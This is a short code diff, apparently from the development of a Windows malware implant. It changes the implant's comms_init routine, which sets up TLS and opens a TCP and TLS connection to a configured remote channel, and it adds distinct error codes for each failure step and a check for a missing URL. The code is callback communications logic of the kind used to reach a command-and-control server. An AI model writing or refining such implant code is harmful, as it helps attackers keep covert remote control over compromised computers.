@@ -1449,19 +1449,21 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
 
     /* Initialize TLS credentials */
     status = comms_tls_init(&g_comms_ctx);
-    if (!NT_SUCCESS(status)) return status;
+    if (!NT_SUCCESS(status)) return (NTSTATUS)0xC0000170; /* 170 = TLS init */
 
     /* Connect to primary channel */
     CHANNEL_CONFIG *ch = &cfg->channels[best_idx];
-    status = comms_tcp_connect(&g_comms_ctx, ch->url, ch->port);
-    if (!NT_SUCCESS(status)) return status;
+    if (!ch->url[0]) return (NTSTATUS)0xC0000171; /* 171 = no URL */
 
-    /* TLS handshake for HTTP channels */
+    status = comms_tcp_connect(&g_comms_ctx, ch->url, ch->port);
+    if (!NT_SUCCESS(status)) return (NTSTATUS)0xC0000172; /* 172 = TCP connect */
+
+    /* TLS handshake for HTTPS channels */
     if (ch->type == CHANNEL_HTTP) {
         status = comms_tls_handshake(&g_comms_ctx, ch->url);
         if (!NT_SUCCESS(status)) {
             comms_tcp_close(&g_comms_ctx);
-            return status;
+            return (NTSTATUS)0xC0000173; /* 173 = TLS handshake */
         }
     }
 
